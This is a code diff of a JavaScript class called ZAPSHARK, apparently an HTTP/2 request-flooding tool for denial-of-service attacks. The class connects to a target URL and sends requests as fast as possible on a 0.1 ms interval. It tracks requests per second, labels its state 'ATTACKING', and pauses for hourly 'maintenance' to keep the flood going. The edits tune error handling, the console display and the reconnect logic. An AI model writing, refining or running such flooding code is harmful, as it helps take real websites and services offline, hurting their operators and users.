@@ -15,39 +15,20 @@ class ZAPSHARK {
         
         // Maintenance
         this.lastMaintenance = Date.now();
-        this.maintenanceInterval = 3600000;
-        this.maintenanceDuration = 600000;
+        this.maintenanceInterval = 3600000; // 1 hour
+        this.maintenanceDuration = 600000;  // 10 minutes
         
         this.client = null;
         this.attackInterval = null;
     }
 
     async setupClient() {
-        try {
-            this.client = http2.connect(this.targetUrl);
-            
-            // SILENCE ALL ERRORS
-            this.client.on('error', () => {
-                this.client = null;
-                setTimeout(() => this.setupClient(), 100);
-            });
-            
-            this.client.on('goaway', () => {
-                this.client = null;
-                setTimeout(() => this.setupClient(), 100);
-            });
-            
-        } catch (err) {
-            this.client = null;
-            setTimeout(() => this.setupClient(), 100);
-        }
+        this.client = http2.connect(this.targetUrl);
+        this.client.on('error', (err) => {});
     }
 
     sendRequest() {
-        if (!this.client) {
-            this.setupClient();
-            return;
-        }
+        if (!this.client) return;
 
         try {
             const req = this.client.request({
@@ -55,8 +36,6 @@ class ZAPSHARK {
                 ':path': '/'
             });
             
-            // SILENCE STREAM ERRORS
-            req.on('error', () => {});
             req.on('response', () => {
                 req.destroy();
             });
@@ -64,7 +43,7 @@ class ZAPSHARK {
             req.end();
             
         } catch (err) {
-            // SILENT FAIL
+            // Silent fail
         } finally {
             this.totalRequests++;
             this.requestsSinceLastCalc++;
@@ -92,13 +71,9 @@ class ZAPSHARK {
     updateDisplay() {
         this.calculateRPS();
         
-        process.stdout.write('\x1B[2J\x1B[0f');
-        console.log(`ZAP-SHARK: (${this.formatRuntime()}) | (${this.status})`);
-        console.log('======================================');
-        console.log(`T-ARP — ${this.totalRequests}`);
-        console.log(`ARPS-S — ${this.currentRPS.toFixed(1)}`);
-        console.log('======================================');
-        console.log('©ZAP-SHARK — 2023 | V1');
+        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
+                           `TOTAL: ${this.totalRequests} | ` +
+                           `RPS: ${this.currentRPS.toFixed(1)}`);
     }
 
     flushDNS() {
@@ -112,9 +87,8 @@ class ZAPSHARK {
     flushSockets() {
         if (this.client) {
             this.client.destroy();
-            this.client = null;
+            this.setupClient();
         }
-        setTimeout(() => this.setupClient(), 100);
     }
 
     checkMaintenance() {
@@ -122,15 +96,18 @@ class ZAPSHARK {
         const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
         
         if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
+            console.log('\n=== MAINTENANCE STARTED ===');
             this.status = "PAUSED";
             
             this.flushDNS();
             this.flushSockets();
             
+            // Clear attack interval
             if (this.attackInterval) {
                 clearInterval(this.attackInterval);
             }
             
+            // Resume after 10 minutes
             setTimeout(() => {
                 this.resumeAttack();
             }, this.maintenanceDuration);
@@ -142,27 +119,28 @@ class ZAPSHARK {
     resumeAttack() {
         this.status = "ATTACKING";
         this.lastMaintenance = Date.now();
+        console.log('\n=== MAINTENANCE COMPLETED - RESUMING ATTACK ===');
         this.startAttack();
     }
 
     startAttack() {
-        // POWER 2x - Double the attack speed
+        // Max RPS - minimal delay
         this.attackInterval = setInterval(() => {
             if (this.status === "ATTACKING") {
-                // Send 2 requests per interval for 2x power
-                this.sendRequest();
                 this.sendRequest();
                 this.updateDisplay();
             }
-        }, 0.1);
+        }, 0.1); // Minimal delay for max RPS
     }
 
     async start() {
-        // Clear terminal 2x on start
-        process.stdout.write('\x1B[2J\x1B[0f');
-        process.stdout.write('\x1B[2J\x1B[0f');
-        
         await this.setupClient();
+        
+        console.log("=== ZAP-SHARK INITIATED ===");
+        console.log("Protocol: HTTP/2");
+        console.log("Mode: High RPS (Pure Resources)");
+        console.log("Maintenance: Auto 10min every hour");
+        console.log("=".repeat(40));
         
         this.startAttack();
         
@@ -185,6 +163,7 @@ class ZAPSHARK {
         if (this.client) {
             this.client.destroy();
         }
+        console.log('\n=== ZAP-SHARK STOPPED ===');
         process.exit(0);
     }
 }
